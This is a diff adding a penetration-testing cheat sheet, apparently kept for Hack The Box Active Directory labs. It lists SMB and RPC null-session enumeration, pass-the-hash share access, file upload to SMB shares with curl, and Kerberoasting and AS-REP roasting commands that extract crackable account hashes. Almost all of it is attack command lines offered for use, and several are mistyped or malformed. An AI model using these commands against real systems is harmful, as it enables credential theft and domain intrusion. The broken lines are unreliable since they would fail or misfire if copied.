@@ -1,0 +1,45 @@
+Remember change DNS
+------------------------------------------------------------------------
+cat /etc/resolv.conf
+nameserver xxxxx
+nameserver xxxxx
+localsearch xxxx.local
+domain xxxx.local
+------------------------------------------------------------------------
+*Locate dns ip with log VPN or user dnsenum , nmap -p 389 , crackmapexec
+------------------------------------------------------------------------
+Test a session null
+------------------------------------------------------------------
+rpcclient -U "" ip
+enumdomusers
+enumdogroups
+querygroupmem 0x200
+queryuser 0x1f4
+--------------------------------------------------------------------
+SMB
+find / -writable 2<dev/null
+---------------------------------------------------------
+SMBCLIENT -L
+SMBCLIENT -N -L
+smbmap -H -u anonymous -d HTB.LOCAL  or localhsot
+smbclient //ip/ -U 'admin&admin'
+smbmap -d active -u user -p -H funciona
+nmap script smb-enum-shares-nse --script-args smbusername=  ,smbhash= hash   -p 445 ip
+smbclient -W YPUFFY -U adfwe --pw-nt-hash //ip/alice hash
+smbclient \\ip/user
+smbclient -U \\\\ip\\ruta
+smbclient dentro usar put o get
+smbclient \\\\\ip\\carpeta -U usuario
+smbclient -U user -W dominmio //ip/carpeta
+smbclient -U Administrator -W ACTIVE.HTB //10.10.10.100/Users
+curl --upload-file phpinfo.php -u 'root' smb://10.10.10.123/Development/
+curl --upload-file phpinfo.php -u 'DOMAIN\Username' smb://10.10.10.123/Development/archiv
+echo; smbclient --L -U guest\! 2>/dev/null | grep "Disk" | awk '{print $1}' | while read sharedFolder;do echo "===${sharedFolder}==="; smbclient //ip/${sharedFolder} -U user -c dir; echo; done
+
+--------------------------------------------------------------------
+KALI
+GetUserSPNs.py domain/user:pass -outfile kerberoasting -dc-ip ip
+GetNPUsers.py  domain/user:pass -request -format hashcat
+WINDOWS
+Get-TGSCipher -SPN "vpn:port"
+--------------------------------------------------------------------
